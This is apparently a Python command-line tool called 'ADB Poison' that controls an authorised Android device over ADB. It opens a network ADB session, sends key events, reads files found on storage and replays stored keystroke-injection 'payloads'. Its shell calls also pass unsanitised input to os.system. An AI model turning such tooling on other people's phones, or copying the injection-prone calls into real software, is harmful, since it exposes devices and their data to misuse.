import argparse
import random
import re
import cmd
import subprocess
import time
import os
RED = "\033[31m"        
GREEN = "\033[32m"   
DARK_GREEN = "\033[2;49;32m" 
WHITE = "\033[37m"      
YELLOW = "\033[33m"
BLUE = "\033[0;34m" 	
PURPLE = "\033[0;35m" 	
CYAN = "\033[0;36m"
NEGATIVE = "\033[7m"
RESET = WHITE 

def run_adb_command(command):
    """Executes an ADB command and prints the output."""
    try:
        result = subprocess.run(f"adb {command}", shell=True, text=True, capture_output=True)
        if result.returncode == 0:
            print(GREEN + result.stdout + RESET)
        else:
            print(RED + result.stderr + RESET)
    except Exception as e:
        print(RED + f"An error occurred: {e}" + RESET)
def return_device():
    while True:
        cmdto = "adb devices"
        result = subprocess.run(cmdto, shell=True, capture_output=True, text=True)
        splitter = str(result.stdout).splitlines()
        device = splitter[1].split()
        resultado = re.findall("device", str(result.stdout))
        if len(str(result.stdout)) > 26:
            if len(resultado) == 2:
                return device[0]
                break
            elif "unauthorized" in str(result.stdout):
                return device[0]
            else:
                return device[0]
        else:
            pass

def check_devices():
    while True:
        cmdto = "adb devices"
        result = subprocess.run(cmdto, shell=True, capture_output=True, text=True)
        splitter = str(result.stdout).splitlines()
        device = splitter[1].split()
        resultado = re.findall("device", str(result.stdout))
        if len(str(result.stdout)) > 26:
            if len(resultado) == 2:
                print(f"[*] Device {GREEN}{device[0]}{WHITE} found, starting program...")
                break
            elif "unauthorized" in str(result.stdout):
                print(resultado)
                print(f"[*] Device {RED}{device[0]}{WHITE} found, but not authorized.")
                time.sleep(1)
                os.system("clear")
            else:
                print(resultado)
                print(f"[*] Device {RED}{device[0]}{WHITE} found, but not authorized. (error code 2)")
                time.sleep(1)
                os.system("clear")
        else:
            print("[!] Waiting for device.")
            os.system("clear")
def animation():
    intro = f"""
     .    .___   ____        .___    ___   _   _____   ___   __    _
    /|    /   `  /   \       /   \ .'   `. |  (      .'   `. |\   | 
   /  \   |    | |,_-<       |,_-' |     | |   `--.  |     | | \  | 
  /---'\  |    | |    `      |     |     | |      |  |     | |  \ | 
,'      \ /---/  `----'      /      `.__.' / \___.'   `.__.' |   \| by {GREEN}w3irdguy{WHITE}
    """
    colors = [WHITE, RED, YELLOW, GREEN, BLUE, CYAN, PURPLE]
    os.system("clear")
    for i in range(20):
        randomic = random.choice(colors)
        intro = f"""{randomic}
     .    .___   ____        .___    ___   _   _____   ___   __    _
    /|    /   `  /   \       /   \ .'   `. |  (      .'   `. |\   | 
   /  \   |    | |,_-<       |,_-' |     | |   `--.  |     | | \  | 
  /---'\  |    | |    `      |     |     | |      |  |     | |  \ | 
,'      \ /---/  `----'      /      `.__.' / \___.'   `.__.' |   \| by {GREEN}w3irdguy{WHITE}
    """
        print(intro)
        time.sleep(0.05)
        os.system("clear")
    item = ['a','d','b','p','1','>']
    os.system("clear")
    print(intro)
    print(item[0])
    time.sleep(0.3)
    os.system("clear")
    print(intro)
    print(item[0]+item[1])
    time.sleep(0.3)
    os.system("clear")
    print(intro)
    print(item[0]+item[1]+item[2])
    time.sleep(0.3)
    os.system("clear")
    print(intro)
    print(item[0]+item[1]+item[2]+item[3])
    time.sleep(0.3)
    os.system("clear")
    print(intro)
    print(item[0]+item[1]+item[2]+item[3]+item[4])
    time.sleep(0.3)
    os.system("clear")
    print(intro)
    print(item[0]+item[1]+item[2]+item[3]+item[4]+item[5])
    time.sleep(1)
    os.system("clear")

    
        
class MyTerminal(cmd.Cmd):
    intro = f"""
{GREEN}     .    .___   ___        {WHITE}.___    ___   _   _____   ___   __    _
{GREEN}    /|    /   `  /   \       {WHITE}/   \ .'   `. |  (      .'   `. |\   | 
{GREEN}   /  \   |    | |,_-<       {WHITE}|,_-' |     | |   `--.  |     | | \  | 
{GREEN}  /---'\  |    | |    `      {WHITE}|     |     | |      |  |     | |  \ | 
{GREEN},'      \ /---/  `----'      {WHITE}/      `.__.' / \___.'   `.__.' |   \|{WHITE}by {PURPLE}w3irdguy{WHITE}
[!] Type {RED}help{WHITE} to show available commands.
    """
    prompt = f'adbp1> {WHITE}'

    def do_exit(self, arg):
        'Quit.'
        print('Exiting...')
        return True

    def do_clear(self, arg):
        intro = f"""
     .    .___   ____        .___    ___   _   _____   ___   __    _
    /|    /   `  /   \       /   \ .'   `. |  (      .'   `. |\   | 
   /  \   |    | |,_-<       |,_-' |     | |   `--.  |     | | \  | 
  /---'\  |    | |    `      |     |     | |      |  |     | |  \ | 
,'      \ /---/  `----'      /      `.__.' / \___.'   `.__.' |   \| by {GREEN}w3irdguy{WHITE}
[!] Type {RED}help{WHITE} to show available commands.
        """
        'Clear the terminal.'
        os.system("clear")
        print(intro)
    def do_ipsession(self, arg):
        '''Transmission Control Protocol on device IP.
        usage: ipsession <OPTIONS>
        options: start, stop
        '''
        cmd = arg.split()
        if not arg:
            print(f"Use {RED}help ipsession{WHITE} to show the options available.")
            return

        elif len(cmd) > 1:
            print("Too many arguments.")
            return
        elif len(cmd) < 1:
            print(f"Use {RED}help ipsession{WHITE} to show the options available.")
            return
        elif len(cmd) == 1 and 'start' in cmd:
            try:
                result = subprocess.run("adb shell ip addr show wlan0 | cut -d'/' -f1 | grep 192.168.", shell=True, capture_output=True, text=True)
                encoder = str(result.stdout)
                finder = encoder.split()
                final_str = finder[1]
                print(f"[*] Running on port {YELLOW}4567{RESET}...")
                run_adb_command("tcpip 4567")
                time.sleep(5)
                run_adb_command(f"connect {final_str}:4567")
            except:
                print(f"[!] Error! Probably some device is alreadly on, please use {RED}ipsession{GREEN} show{RESET}")
        elif len(cmd) == 1 and 'stop' in cmd:
            print("[*] Finishing server...")
            run_adb_command(f"disconnect")
        elif len(cmd) == 1 and 'show' in cmd:
            print(f"[*] Sessions Online: ")
            result = subprocess.run("adb devices | grep 192.168", shell=True, capture_output=True, text=True)
            encoder = str(result.stdout)
            locate = encoder.find(':')
            ip = encoder[:locate]
            poret = encoder[locate:]
            port2 = poret.split()
            port = port2[0].replace(':', '')
            print(f"[{GREEN}*{RESET}] Session found: IP: {GREEN}{ip}{RESET}, PORT: {YELLOW}{port}{RESET}")

        else:
            print("Unknown Error")
            return        


    def do_multi_keyevent(self, keycodes):
        'Executes a custom sequence of keyevents: multi_keyevent <keycode1> <keycode2> ...'
        if not keycodes:
            print(RED + "You need to send at least 1 keycode" + RESET)
            return
        
        keycode_list = keycodes.split()  
        for keycode in keycode_list:
            try:
                int_keycode = int(keycode)  
                print(GREEN + f"Sending keyevent {int_keycode}..." + RESET)
                run_adb_command(f"shell input keyevent {int_keycode}")
            except ValueError:
                print(RED + f"'{keycode}' is not a valid keycode" + RESET)

    def help_multi_keyevent(self):
        'Execute a sequence of key events: e.g., multi_keyevent 26 3 4'
        print("Execute a sequence of key events.")
        print("usage: multi_keyevent <keycode1> <keycode2> ...")

    def do_keyevent(self, keycode):
        'Send a key event for the connected device: keyevent <keycode>. Use "help keyevent" to show available keycodes.'
        if not keycode:
            print(RED + "You need to provide a keycode." + RESET)
            return
        run_adb_command(f"shell input keyevent {keycode}")

    def do_searcher(self, args):
        '''Search a list of files in internal memory to display the content in terminal.
        usage: searcher <path> <extension>'''
        paths = args.split()
        if len(paths) < 2:
            print("Need a path (e.g. /sdcard/) and an extension (e.g. .py, .txt, .xml)")
            return
        cmd8 = f"adb shell find {paths[0]} | grep {paths[1]}"
        result = subprocess.run(cmd8, shell=True, capture_output=True, text=True)
        list1 = str(result.stdout).splitlines()
        for line in list1:
            resp = input(f"{WHITE}> Do you want to see {RED}{line}{WHITE}?(y/n): ")
            if 'y' in resp or "yes" in resp:
                os.system(f"adb shell cat {line}")
            else:
                pass

    def do_adbpoison(self, args):
        '''Payload executor and creator.
        usage: adbpoison <options> 
        options: create, execute, list, show-content
        ex: adbpoison execute payloadname 5(Delay for each execution.)
        '''
        if not args:
            print("You need to choose an option: create, execute, list and show-content")
            return
        elif "show-content" in args:
            cmds = args.split()
            if len(cmds) < 2:
                print("You need to choose a file to show the content.")
                return
            elif len(cmds) == 2:
                os.system(f"cat adbpayloads/{cmds[1]}.adbpayload")
            elif len(cmds) > 2:
                print("More then 2 args!")
            else:
                print("Unknown Error")

        elif "create" in args:
            self.prompt = f'adbp1({GREEN}adbpoison{WHITE}/{YELLOW}creator{WHITE})> '
            event_name = input("Your payload name: ")
            events_number = int(input("Max events (e.g. 20): "))
            key_events = []
            print("The system will show the available key events in 8 seconds (so many).")
            time.sleep(8)
            key_events2 = """
  0  - KEYCODE_UNKNOWN
  1  - KEYCODE_SOFT_LEFT
  2  - KEYCODE_SOFT_RIGHT
  3  - KEYCODE_HOME
  4  - KEYCODE_BACK
  5  - KEYCODE_CALL
  6  - KEYCODE_ENDCALL
  7  - KEYCODE_0
  8  - KEYCODE_1
  9  - KEYCODE_2
 10  - KEYCODE_3
 11  - KEYCODE_4
 12  - KEYCODE_5
 13  - KEYCODE_6
 14  - KEYCODE_7
 15  - KEYCODE_8
 16  - KEYCODE_9
 17  - KEYCODE_STAR
 18  - KEYCODE_POUND
 19  - KEYCODE_DPAD_UP
 20  - KEYCODE_DPAD_DOWN
 21  - KEYCODE_DPAD_LEFT
 22  - KEYCODE_DPAD_RIGHT
 23  - KEYCODE_DPAD_CENTER
 24  - KEYCODE_VOLUME_UP
 25  - KEYCODE_VOLUME_DOWN
 26  - KEYCODE_POWER
 27  - KEYCODE_CAMERA
 28  - KEYCODE_CLEAR
 29  - KEYCODE_A
 30  - KEYCODE_B
 31  - KEYCODE_C
 32  - KEYCODE_D
 33  - KEYCODE_E
 34  - KEYCODE_F
 35  - KEYCODE_G
 36  - KEYCODE_H
 37  - KEYCODE_I
 38  - KEYCODE_J
 39  - KEYCODE_K
 40  - KEYCODE_L
 41  - KEYCODE_M
 42  - KEYCODE_N
 43  - KEYCODE_O
 44  - KEYCODE_P
 45  - KEYCODE_Q
 46  - KEYCODE_R
 47  - KEYCODE_S
 48  - KEYCODE_T
 49  - KEYCODE_U
 50  - KEYCODE_V
 51  - KEYCODE_W
 52  - KEYCODE_X
 53  - KEYCODE_Y
 54  - KEYCODE_Z
 55  - KEYCODE_COMMA
 56  - KEYCODE_PERIOD
 57  - KEYCODE_ALT_LEFT
 58  - KEYCODE_ALT_RIGHT
 59  - KEYCODE_SHIFT_LEFT
 60  - KEYCODE_SHIFT_RIGHT
 61  - KEYCODE_TAB
 62  - KEYCODE_SPACE
 63  - KEYCODE_SYM
 64  - KEYCODE_EXPLORER
 65  - KEYCODE_ENVELOPE
 66  - KEYCODE_ENTER
 67  - KEYCODE_DEL
 68  - KEYCODE_GRAVE
 69  - KEYCODE_MINUS
 70  - KEYCODE_EQUALS
 71  - KEYCODE_LEFT_BRACKET
 72  - KEYCODE_RIGHT_BRACKET
 73  - KEYCODE_BACKSLASH
 74  - KEYCODE_SEMICOLON
 75  - KEYCODE_APOSTROPHE
 76  - KEYCODE_SLASH
 77  - KEYCODE_AT
 78  - KEYCODE_NUM
 79  - KEYCODE_HEADSETHOOK
 80  - KEYCODE_FOCUS
 81  - KEYCODE_PLUS
 82  - KEYCODE_MENU
 83  - KEYCODE_NOTIFICATION
 84  - KEYCODE_SEARCH
 85  - KEYCODE_MEDIA_PLAY_PAUSE
 86  - KEYCODE_MEDIA_STOP
 87  - KEYCODE_MEDIA_NEXT
 88  - KEYCODE_MEDIA_PREVIOUS
 89  - KEYCODE_MEDIA_REWIND
 90  - KEYCODE_MEDIA_FAST_FORWARD
 91  - KEYCODE_MUTE
 92  - KEYCODE_PAGE_UP
 93  - KEYCODE_PAGE_DOWN
 94  - KEYCODE_PICTSYMBOLS
 95  - KEYCODE_SWITCH_CHARSET
 96  - KEYCODE_BUTTON_A
 97  - KEYCODE_BUTTON_B
 98  - KEYCODE_BUTTON_C
 99  - KEYCODE_BUTTON_X
100  - KEYCODE_BUTTON_Y
101  - KEYCODE_BUTTON_Z
102  - KEYCODE_BUTTON_L1
103  - KEYCODE_BUTTON_R1
104  - KEYCODE_BUTTON_L2
105  - KEYCODE_BUTTON_R2
106  - KEYCODE_BUTTON_THUMBL
107  - KEYCODE_BUTTON_THUMBR
108  - KEYCODE_BUTTON_START
109  - KEYCODE_BUTTON_SELECT
110  - KEYCODE_BUTTON_MODE
111  - KEYCODE_ESCAPE
112  - KEYCODE_FORWARD_DEL
113  - KEYCODE_CTRL_LEFT
114  - KEYCODE_CTRL_RIGHT
115  - KEYCODE_CAPS_LOCK
116  - KEYCODE_SCROLL_LOCK
117  - KEYCODE_META_LEFT
118  - KEYCODE_META_RIGHT
119  - KEYCODE_FUNCTION
120  - KEYCODE_SYSRQ
121  - KEYCODE_BREAK
122  - KEYCODE_MOVE_HOME
123  - KEYCODE_MOVE_END
124  - KEYCODE_INSERT
125  - KEYCODE_FORWARD
126  - KEYCODE_MEDIA_PLAY
127  - KEYCODE_MEDIA_PAUSE
128  - KEYCODE_MEDIA_CLOSE
129  - KEYCODE_MEDIA_EJECT
130  - KEYCODE_MEDIA_RECORD
131  - KEYCODE_F1
132  - KEYCODE_F2
133  - KEYCODE_F3
134  - KEYCODE_F4
135  - KEYCODE_F5
136  - KEYCODE_F6
137  - KEYCODE_F7
138  - KEYCODE_F8
139  - KEYCODE_F9
140  - KEYCODE_F10
141  - KEYCODE_F11
142  - KEYCODE_F12
143  - KEYCODE_NUM_LOCK
144  - KEYCODE_NUMPAD_0
145  - KEYCODE_NUMPAD_1
146  - KEYCODE_NUMPAD_2
147  - KEYCODE_NUMPAD_3
148  - KEYCODE_NUMPAD_4
149  - KEYCODE_NUMPAD_5
150  - KEYCODE_NUMPAD_6
151  - KEYCODE_NUMPAD_7
152  - KEYCODE_NUMPAD_8
153  - KEYCODE_NUMPAD_9
154  - KEYCODE_NUMPAD_DIVIDE
155  - KEYCODE_NUMPAD_MULTIPLY
156  - KEYCODE_NUMPAD_SUBTRACT
157  - KEYCODE_NUMPAD_ADD
158  - KEYCODE_NUMPAD_DOT
159  - KEYCODE_NUMPAD_COMMA
160  - KEYCODE_NUMPAD_ENTER
161  - KEYCODE_NUMPAD_EQUALS
162  - KEYCODE_NUMPAD_LEFT_PAREN
163  - KEYCODE_NUMPAD_RIGHT_PAREN
164  - KEYCODE_VOLUME_MUTE
165  - KEYCODE_INFO
166  - KEYCODE_CHANNEL_UP
167  - KEYCODE_CHANNEL_DOWN
168  - KEYCODE_ZOOM_IN
169  - KEYCODE_ZOOM_OUT
170  - KEYCODE_TV
171  - KEYCODE_WINDOW
172  - KEYCODE_GUIDE
173  - KEYCODE_DVR
174  - KEYCODE_BOOKMARK
175  - KEYCODE_CAPTIONS
176  - KEYCODE_SETTINGS
177  - KEYCODE_TV_POWER
178  - KEYCODE_TV_INPUT
179  - KEYCODE_STB_POWER
180  - KEYCODE_STB_INPUT
181  - KEYCODE_AVR_POWER
182  - KEYCODE_AVR_INPUT
183  - KEYCODE_PROG_RED
184  - KEYCODE_PROG_GREEN
185  - KEYCODE_PROG_YELLOW
186  - KEYCODE_PROG_BLUE
187  - KEYCODE_APP_SWITCH
188  - KEYCODE_BUTTON_1
189  - KEYCODE_BUTTON_2
190  - KEYCODE_BUTTON_3
191  - KEYCODE_BUTTON_4
192  - KEYCODE_BUTTON_5
193  - KEYCODE_BUTTON_6
194  - KEYCODE_BUTTON_7
195  - KEYCODE_BUTTON_8
196  - KEYCODE_BUTTON_9
197  - KEYCODE_BUTTON_10
198  - KEYCODE_BUTTON_11
199  - KEYCODE_BUTTON_12
200  - KEYCODE_BUTTON_13
201  - KEYCODE_BUTTON_14
202  - KEYCODE_BUTTON_15
203  - KEYCODE_BUTTON_16
204  - KEYCODE_LANGUAGE_SWITCH
205  - KEYCODE_MANNER_MODE
206  - KEYCODE_3D_MODE
207  - KEYCODE_CONTACTS
208  - KEYCODE_CALENDAR
209  - KEYCODE_MUSIC
210  - KEYCODE_CALCULATOR
211  - KEYCODE_ZENKAKU_HANKAKU
212  - KEYCODE_EISU
213  - KEYCODE_MUHENKAN
214  - KEYCODE_HENKAN
215  - KEYCODE_KATAKANA_HIRAGANA
216  - KEYCODE_YEN
217  - KEYCODE_RO
218  - KEYCODE_KANA
219  - KEYCODE_ASSIST
220  - KEYCODE_BRIGHTNESS_DOWN
221  - KEYCODE_BRIGHTNESS_UP
222  - KEYCODE_MEDIA_AUDIO_TRACK
223  - KEYCODE_SLEEP
224  - KEYCODE_WAKEUP
225  - KEYCODE_PAIRING
226  - KEYCODE_MEDIA_TOP_MENU
227  - KEYCODE_11
228  - KEYCODE_12
229  - KEYCODE_LAST_CHANNEL
230  - KEYCODE_TV_DATA_SERVICE
231  - KEYCODE_VOICE_ASSIST
232  - KEYCODE_TV_RADIO_SERVICE
233  - KEYCODE_TV_TELETEXT
234  - KEYCODE_TV_NUMBER_ENTRY
235  - KEYCODE_TV_TERRESTRIAL_ANALOG
236  - KEYCODE_TV_TERRESTRIAL_DIGITAL
237  - KEYCODE_TV_SATELLITE
238  - KEYCODE_TV_SATELLITE_BS
239  - KEYCODE_TV_SATELLITE_CS
240  - KEYCODE_TV_SATELLITE_SERVICE
241  - KEYCODE_TV_NETWORK
242  - KEYCODE_TV_ANTENNA_CABLE
243  - KEYCODE_TV_INPUT_HDMI_1
244  - KEYCODE_TV_INPUT_HDMI_2
245  - KEYCODE_TV_INPUT_HDMI_3
246  - KEYCODE_TV_INPUT_HDMI_4
247  - KEYCODE_TV_INPUT_COMPOSITE_1
248  - KEYCODE_TV_INPUT_COMPOSITE_2
249  - KEYCODE_TV_INPUT_COMPONENT_1
250  - KEYCODE_TV_INPUT_COMPONENT_2
251  - KEYCODE_TV_INPUT_VGA_1
252  - KEYCODE_TV_AUDIO_DESCRIPTION
253  - KEYCODE_TV_AUDIO_DESCRIPTION_MIX_UP
254  - KEYCODE_TV_AUDIO_DESCRIPTION_MIX_DOWN
255  - KEYCODE_TV_ZOOM_MODE
256  - KEYCODE_TV_CONTENTS_MENU
257  - KEYCODE_TV_MEDIA_CONTEXT_MENU
258  - KEYCODE_TV_TIMER_PROGRAMMING
259  - KEYCODE_HELP
260  - KEYCODE_NAVIGATE_PREVIOUS
261  - KEYCODE_NAVIGATE_NEXT
262  - KEYCODE_NAVIGATE_IN
263  - KEYCODE_NAVIGATE_OUT
264  - KEYCODE_STEM_PRIMARY
265  - KEYCODE_STEM_1
266  - KEYCODE_STEM_2
267  - KEYCODE_STEM_3
268  - KEYCODE_DPAD_UP_LEFT
269  - KEYCODE_DPAD_DOWN_LEFT
270  - KEYCODE_DPAD_UP_RIGHT
271  - KEYCODE_DPAD_DOWN_RIGHT
272  - KEYCODE_MEDIA_SKIP_FORWARD
273  - KEYCODE_MEDIA_SKIP_BACKWARD
274  - KEYCODE_MEDIA_STEP_FORWARD
275  - KEYCODE_MEDIA_STEP_BACKWARD
276  - KEYCODE_SOFT_SLEEP
277  - KEYCODE_CUT
278  - KEYCODE_COPY
279  - KEYCODE_PASTE
280  - KEYCODE_SYSTEM_NAVIGATION_UP
281  - KEYCODE_SYSTEM_NAVIGATION_DOWN
282  - KEYCODE_SYSTEM_NAVIGATION_LEFT
283  - KEYCODE_SYSTEM_NAVIGATION_RIGHT
284  - KEYCODE_ALL_APPS
285  - KEYCODE_REFRESH
            """
            print(GREEN + key_events2 + WHITE)
            for i in range(0, events_number, 1):
                if i == 0:
                    print("Please, dont put string in first and second line!")
                    key = int(input(f"Your {i} key: "))
                    key_events.append(key)
                elif i == 1:
                    key = int(input(f"Your {i} key: "))
                    key_events.append(key)
                else:
                    item = '%20'
                    stringorkey = str(input(f"Your {i} key or text: ")).replace(' ',item)
                    key_events.append(stringorkey)
            with open(f"adbpayloads/{event_name}.adbpayload", 'a') as file:
                for item in key_events:
                    file.write(f"{item}\n")
            print(f"Payload {YELLOW}{event_name}{WHITE} was created with {GREEN}success{WHITE}!") 
        elif "execute" in args:
            self.prompt = f'adbp1({GREEN}adbpoison{WHITE}/{RED}executer{WHITE})> '
            cmds = args.split()
            if len(cmds) > 3:
                print("More than 3 arguments!")
                return
            elif len(cmds) < 3:
                print("Need at least 3 args!(adbpoison except)")
                return
            elif len(cmds) == 3:
                delay = int(cmds[2])
                with open(f"adbpayloads/{cmds[1]}.adbpayload", 'r') as file:
                    for line in file.readlines():
                        if "match" in str(re.match("[0-9]{1,3}", line)):
                            print(f"Executing {line}")
                            time.sleep(delay)
                            os.system(f"adb shell input keyevent {line}")
                        elif "match" in str(re.match("[a-zA-Z]", line)):
                            print(f'Sending {line}')
                            time.sleep(delay)
                            os.system(f"adb shell input text '{line}'")
                            
        elif "list" in args:
            self.prompt = f'adbp1({GREEN}adbpoison{WHITE}/{PURPLE}lister{WHITE})> '
            print(f"Payloads {GREEN}Available{WHITE}:")
            req = subprocess.run("ls adbpayloads | grep .adbpayload", shell=True, capture_output=True, text=True)
            encoder = str(req.stdout)
            iterator = 1
            for line in encoder.splitlines():
                finder = line.find('.')
                print(f"{iterator} - {line[:finder]}")
                iterator += 1 
    def do_back(self, arg):
        'Return to the default terminal.'
        self.prompt = 'adbp1> '

    def help_keyevent(self):
        'List all available key event codes.'
        key_events = """
  0  - KEYCODE_UNKNOWN
  1  - KEYCODE_SOFT_LEFT
  2  - KEYCODE_SOFT_RIGHT
  3  - KEYCODE_HOME
  4  - KEYCODE_BACK
  5  - KEYCODE_CALL
  6  - KEYCODE_ENDCALL
  7  - KEYCODE_0
  8  - KEYCODE_1
  9  - KEYCODE_2
 10  - KEYCODE_3
 11  - KEYCODE_4
 12  - KEYCODE_5
 13  - KEYCODE_6
 14  - KEYCODE_7
 15  - KEYCODE_8
 16  - KEYCODE_9
 17  - KEYCODE_STAR
 18  - KEYCODE_POUND
 19  - KEYCODE_DPAD_UP
 20  - KEYCODE_DPAD_DOWN
 21  - KEYCODE_DPAD_LEFT
 22  - KEYCODE_DPAD_RIGHT
 23  - KEYCODE_DPAD_CENTER
 24  - KEYCODE_VOLUME_UP
 25  - KEYCODE_VOLUME_DOWN
 26  - KEYCODE_POWER
 27  - KEYCODE_CAMERA
 28  - KEYCODE_CLEAR
 29  - KEYCODE_A
 30  - KEYCODE_B
 31  - KEYCODE_C
 32  - KEYCODE_D
 33  - KEYCODE_E
 34  - KEYCODE_F
 35  - KEYCODE_G
 36  - KEYCODE_H
 37  - KEYCODE_I
 38  - KEYCODE_J
 39  - KEYCODE_K
 40  - KEYCODE_L
 41  - KEYCODE_M
 42  - KEYCODE_N
 43  - KEYCODE_O
 44  - KEYCODE_P
 45  - KEYCODE_Q
 46  - KEYCODE_R
 47  - KEYCODE_S
 48  - KEYCODE_T
 49  - KEYCODE_U
 50  - KEYCODE_V
 51  - KEYCODE_W
 52  - KEYCODE_X
 53  - KEYCODE_Y
 54  - KEYCODE_Z
 55  - KEYCODE_COMMA
 56  - KEYCODE_PERIOD
 57  - KEYCODE_ALT_LEFT
 58  - KEYCODE_ALT_RIGHT
 59  - KEYCODE_SHIFT_LEFT
 60  - KEYCODE_SHIFT_RIGHT
 61  - KEYCODE_TAB
 62  - KEYCODE_SPACE
 63  - KEYCODE_SYM
 64  - KEYCODE_EXPLORER
 65  - KEYCODE_ENVELOPE
 66  - KEYCODE_ENTER
 67  - KEYCODE_DEL
 68  - KEYCODE_GRAVE
 69  - KEYCODE_MINUS
 70  - KEYCODE_EQUALS
 71  - KEYCODE_LEFT_BRACKET
 72  - KEYCODE_RIGHT_BRACKET
 73  - KEYCODE_BACKSLASH
 74  - KEYCODE_SEMICOLON
 75  - KEYCODE_APOSTROPHE
 76  - KEYCODE_SLASH
 77  - KEYCODE_AT
 78  - KEYCODE_NUM
 79  - KEYCODE_HEADSETHOOK
 80  - KEYCODE_FOCUS
 81  - KEYCODE_PLUS
 82  - KEYCODE_MENU
 83  - KEYCODE_NOTIFICATION
 84  - KEYCODE_SEARCH
 85  - KEYCODE_MEDIA_PLAY_PAUSE
 86  - KEYCODE_MEDIA_STOP
 87  - KEYCODE_MEDIA_NEXT
 88  - KEYCODE_MEDIA_PREVIOUS
 89  - KEYCODE_MEDIA_REWIND
 90  - KEYCODE_MEDIA_FAST_FORWARD
 91  - KEYCODE_MUTE
 92  - KEYCODE_PAGE_UP
 93  - KEYCODE_PAGE_DOWN
 94  - KEYCODE_PICTSYMBOLS
 95  - KEYCODE_SWITCH_CHARSET
 96  - KEYCODE_BUTTON_A
 97  - KEYCODE_BUTTON_B
 98  - KEYCODE_BUTTON_C
 99  - KEYCODE_BUTTON_X
100  - KEYCODE_BUTTON_Y
101  - KEYCODE_BUTTON_Z
102  - KEYCODE_BUTTON_L1
103  - KEYCODE_BUTTON_R1
104  - KEYCODE_BUTTON_L2
105  - KEYCODE_BUTTON_R2
106  - KEYCODE_BUTTON_THUMBL
107  - KEYCODE_BUTTON_THUMBR
108  - KEYCODE_BUTTON_START
109  - KEYCODE_BUTTON_SELECT
110  - KEYCODE_BUTTON_MODE
111  - KEYCODE_ESCAPE
112  - KEYCODE_FORWARD_DEL
113  - KEYCODE_CTRL_LEFT
114  - KEYCODE_CTRL_RIGHT
115  - KEYCODE_CAPS_LOCK
116  - KEYCODE_SCROLL_LOCK
117  - KEYCODE_META_LEFT
118  - KEYCODE_META_RIGHT
119  - KEYCODE_FUNCTION
120  - KEYCODE_SYSRQ
121  - KEYCODE_BREAK
122  - KEYCODE_MOVE_HOME
123  - KEYCODE_MOVE_END
124  - KEYCODE_INSERT
125  - KEYCODE_FORWARD
126  - KEYCODE_MEDIA_PLAY
127  - KEYCODE_MEDIA_PAUSE
128  - KEYCODE_MEDIA_CLOSE
129  - KEYCODE_MEDIA_EJECT
130  - KEYCODE_MEDIA_RECORD
131  - KEYCODE_F1
132  - KEYCODE_F2
133  - KEYCODE_F3
134  - KEYCODE_F4
135  - KEYCODE_F5
136  - KEYCODE_F6
137  - KEYCODE_F7
138  - KEYCODE_F8
139  - KEYCODE_F9
140  - KEYCODE_F10
141  - KEYCODE_F11
142  - KEYCODE_F12
143  - KEYCODE_NUM_LOCK
144  - KEYCODE_NUMPAD_0
145  - KEYCODE_NUMPAD_1
146  - KEYCODE_NUMPAD_2
147  - KEYCODE_NUMPAD_3
148  - KEYCODE_NUMPAD_4
149  - KEYCODE_NUMPAD_5
150  - KEYCODE_NUMPAD_6
151  - KEYCODE_NUMPAD_7
152  - KEYCODE_NUMPAD_8
153  - KEYCODE_NUMPAD_9
154  - KEYCODE_NUMPAD_DIVIDE
155  - KEYCODE_NUMPAD_MULTIPLY
156  - KEYCODE_NUMPAD_SUBTRACT
157  - KEYCODE_NUMPAD_ADD
158  - KEYCODE_NUMPAD_DOT
159  - KEYCODE_NUMPAD_COMMA
160  - KEYCODE_NUMPAD_ENTER
161  - KEYCODE_NUMPAD_EQUALS
162  - KEYCODE_NUMPAD_LEFT_PAREN
163  - KEYCODE_NUMPAD_RIGHT_PAREN
164  - KEYCODE_VOLUME_MUTE
165  - KEYCODE_INFO
166  - KEYCODE_CHANNEL_UP
167  - KEYCODE_CHANNEL_DOWN
168  - KEYCODE_ZOOM_IN
169  - KEYCODE_ZOOM_OUT
170  - KEYCODE_TV
171  - KEYCODE_WINDOW
172  - KEYCODE_GUIDE
173  - KEYCODE_DVR
174  - KEYCODE_BOOKMARK
175  - KEYCODE_CAPTIONS
176  - KEYCODE_SETTINGS
177  - KEYCODE_TV_POWER
178  - KEYCODE_TV_INPUT
179  - KEYCODE_STB_POWER
180  - KEYCODE_STB_INPUT
181  - KEYCODE_AVR_POWER
182  - KEYCODE_AVR_INPUT
183  - KEYCODE_PROG_RED
184  - KEYCODE_PROG_GREEN
185  - KEYCODE_PROG_YELLOW
186  - KEYCODE_PROG_BLUE
187  - KEYCODE_APP_SWITCH
188  - KEYCODE_BUTTON_1
189  - KEYCODE_BUTTON_2
190  - KEYCODE_BUTTON_3
191  - KEYCODE_BUTTON_4
192  - KEYCODE_BUTTON_5
193  - KEYCODE_BUTTON_6
194  - KEYCODE_BUTTON_7
195  - KEYCODE_BUTTON_8
196  - KEYCODE_BUTTON_9
197  - KEYCODE_BUTTON_10
198  - KEYCODE_BUTTON_11
199  - KEYCODE_BUTTON_12
200  - KEYCODE_BUTTON_13
201  - KEYCODE_BUTTON_14
202  - KEYCODE_BUTTON_15
203  - KEYCODE_BUTTON_16
204  - KEYCODE_LANGUAGE_SWITCH
205  - KEYCODE_MANNER_MODE
206  - KEYCODE_3D_MODE
207  - KEYCODE_CONTACTS
208  - KEYCODE_CALENDAR
209  - KEYCODE_MUSIC
210  - KEYCODE_CALCULATOR
211  - KEYCODE_ZENKAKU_HANKAKU
212  - KEYCODE_EISU
213  - KEYCODE_MUHENKAN
214  - KEYCODE_HENKAN
215  - KEYCODE_KATAKANA_HIRAGANA
216  - KEYCODE_YEN
217  - KEYCODE_RO
218  - KEYCODE_KANA
219  - KEYCODE_ASSIST
220  - KEYCODE_BRIGHTNESS_DOWN
221  - KEYCODE_BRIGHTNESS_UP
222  - KEYCODE_MEDIA_AUDIO_TRACK
223  - KEYCODE_SLEEP
224  - KEYCODE_WAKEUP
225  - KEYCODE_PAIRING
226  - KEYCODE_MEDIA_TOP_MENU
227  - KEYCODE_11
228  - KEYCODE_12
229  - KEYCODE_LAST_CHANNEL
230  - KEYCODE_TV_DATA_SERVICE
231  - KEYCODE_VOICE_ASSIST
232  - KEYCODE_TV_RADIO_SERVICE
233  - KEYCODE_TV_TELETEXT
234  - KEYCODE_TV_NUMBER_ENTRY
235  - KEYCODE_TV_TERRESTRIAL_ANALOG
236  - KEYCODE_TV_TERRESTRIAL_DIGITAL
237  - KEYCODE_TV_SATELLITE
238  - KEYCODE_TV_SATELLITE_BS
239  - KEYCODE_TV_SATELLITE_CS
240  - KEYCODE_TV_SATELLITE_SERVICE
241  - KEYCODE_TV_NETWORK
242  - KEYCODE_TV_ANTENNA_CABLE
